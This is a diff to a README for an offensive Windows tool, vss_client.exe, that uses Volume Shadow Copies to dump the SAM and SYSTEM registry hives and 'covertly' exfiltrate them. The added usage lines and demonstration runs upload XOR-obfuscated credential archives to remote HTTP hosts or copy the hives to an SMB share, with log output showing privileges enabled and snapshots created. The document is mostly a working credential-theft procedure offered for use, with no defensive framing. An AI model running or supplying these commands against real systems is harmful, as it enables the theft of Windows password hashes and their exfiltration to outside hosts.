@@ -1,3 +1,19 @@
+## Description
+ 
+A Volume Shadow Copy client that allows for easy dumping of SAM/SYSTEM hives, or any file for that matter, and covert data exfiltration to an HTTPS service, without touching disk.
+
+```
+C:\Users\user\Source\vss_client>vss_client.exe -h
+Usage:
+  vss_client.exe [<snapshot-relative-path> <destination>] [--keep]
+  vss_client.exe --files <path1> [path2 ...] [--output <archive> | --post <url>] [--keep] [--xor-seed <seed>]
+Examples:
+  vss_client.exe
+  vss_client.exe "\windows\system32\config\system" "\\10.10.10.2\share\system" # if you need to copy a specific file files in a blob locally or to an SMB folder
+  vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --output C:\\loot.zip # if you need files in a blob locally 
+  vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://192.168.100.106:8000 # if you would like to upload remotely
+```
+
 ## Building
 
 Run `compile_vss_client.bat` from a Visual Studio Developer Command Prompt to produce `vss_client.exe` (the script now builds a size-oriented `/MD` release with LTCG, identical-code folding, and RTTI disabled). 
@@ -28,7 +44,7 @@ Running the executable with no arguments now simply creates a client-accessible 
 
 The rest of this file shows the original demonstration run for reference.
 
-# Multi file with POST
+## Multi file with POST
 ```
 C:\Users\user\Source\vss_client>vss_client.exe --files windows\\system32\\config\\sam windows\\system32\\config\\system --xor-seed 1337 --post http://10.10.10.2:8000
 [i] Will archive 2 file(s) and upload to 'http://10.10.10.2:8000' (XOR stream applied)
@@ -122,7 +138,32 @@ xxx
 🌊 ubuntu@ubuntu:/tmp/tmp > 
 ```
 
-# Mount Shadow Volume
+## Single file to SMB share
+```
+C:\Users\user\Source\vss_client>.\vss_client.exe "\windows\system32\config\system" "\\10.10.10.2\share\system"
+[i] Will copy '\windows\system32\config\system' from snapshot to '\\10.10.10.2\share\system'
+[+] Enabling privilege SE_BACKUP_NAME...
+[+] Enabling privilege SE_RESTORE_NAME...
+[+] Enabling privilege SE_MANAGE_VOLUME_NAME...
+[+] COM initialized
+[+] COM security initialized
+[+] IVssBackupComponents created
+[+] Backup components initialized
+[+] VSS context set to client-accessible
+[+] Backup state configured (full, no writers)
+[+] Snapshot set created: E7FD92DB-DB27-46DC-????
+[+] Drive C:\ added to snapshot set
+[+] Snapshot set creation started
+[+] Snapshot creation completed
+[+] Snapshot status: 0x0004230a
+[+] Snapshot device: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy76
+[+] Copying \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy76\windows\system32\config\system -> \\10.10.10.2\share\system
+[+] Copy completed
+[+] Snapshot deleted (1 object(s))
+[+] Completed successfully
+```
+
+## Mount Shadow Volume
 ```
 C:\Users\user\Source\vss_client>vssadmin list shadows
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
